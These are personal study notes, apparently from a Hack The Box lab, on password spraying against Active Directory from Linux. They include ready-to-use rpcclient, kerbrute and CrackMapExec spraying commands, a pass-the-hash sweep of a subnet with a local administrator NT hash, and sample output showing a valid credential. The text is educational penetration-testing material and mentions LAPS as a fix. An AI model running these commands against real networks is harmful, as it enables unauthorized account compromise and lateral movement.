## Table of Contents

  - [Table of Contents](#Table\of\Contents)
- [Internal Password Spraying - From Linux](#internal\password\spraying\-\from\linux)
      - [Using a Bash one-liner for the Attack](#Using\a\Bash\one-liner\for\the\Attack)
      - [Using Kerbrute for the Attack](#Using\Kerbrute\for\the\Attack)
      - [Using CrackMapExec & Filtering Logon Failures](#Using\CrackMapExec\&\Filtering\Logon\Failures)
    - [Local Admin Password reuse](#Local\Admin\Password\reuse)
      - [Local Admin Spraying with CrackMapExec](#Local\Admin\Spraying\with\CrackMapExec)

## Table of Contents

- [Internal Password Spraying - From Linux](#internal\password\spraying\-\from\linux)
      - [Using a Bash one-liner for the Attack](#Using\a\Bash\one-liner\for\the\Attack)
      - [Using Kerbrute for the Attack](#Using\Kerbrute\for\the\Attack)
      - [Using CrackMapExec & Filtering Logon Failures](#Using\CrackMapExec\&\Filtering\Logon\Failures)
    - [Local Admin Password reuse](#Local\Admin\Password\reuse)
      - [Local Admin Spraying with CrackMapExec](#Local\Admin\Spraying\with\CrackMapExec)


# Internal Password Spraying - From Linux

`Rpcclient` is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with `rpcclient`, with the response `Authority Name` indicating a successful login. We can filter out invalid login attempts by `grepping` for `Authority` in the response. The following Bash one-liner (adapted from [here](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)) can be used to perform the attack.


#### Using a Bash one-liner for the Attack

  Using a Bash one-liner for the Attack

```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Let's try this out against the target environment.

  Using a Bash one-liner for the Attack

```shell
gdxqpardo@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```


We can also use `Kerbrute` for the same attack as discussed previously.

#### Using Kerbrute for the Attack

  Using Kerbrute for the Attack

```shell
gdxqpardo@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

```


There are multiple other methods for performing password spraying from Linux. Another great option is using `CrackMapExec`. The ever-versatile tool accepts a text file of usernames to be run against a single password in a spraying attack. Here we grep for `+` to filter out logon failures and hone in on only valid login attempts to ensure we don't miss anything by scrolling through many lines of output.

#### Using CrackMapExec & Filtering Logon Failures

  Using CrackMapExec & Filtering Logon Failures

```shell
gdxqpardo@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```


```shell
gdxqpardo@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

### Local Admin Password reuse
- Admin access and the NTLM pass hash/cleartext password for the local admin acc can be attempted acros multiple hosts in the network.
- CrackMapExec it good. 
- SQL and Mcirosoft Exchange servers often have a highly privileged user logged in or have their credentials persistent in memory.

Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. `Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain`. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.


#### Local Admin Spraying with CrackMapExec

  Local Admin Spraying with CrackMapExec

```shell
gdxqpardo@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```


This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. It is always worth looking for this issue during penetration tests, even if it is not part of our path to compromise the domain, as it is a common issue and should be highlighted for our clients. One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set inter









































































































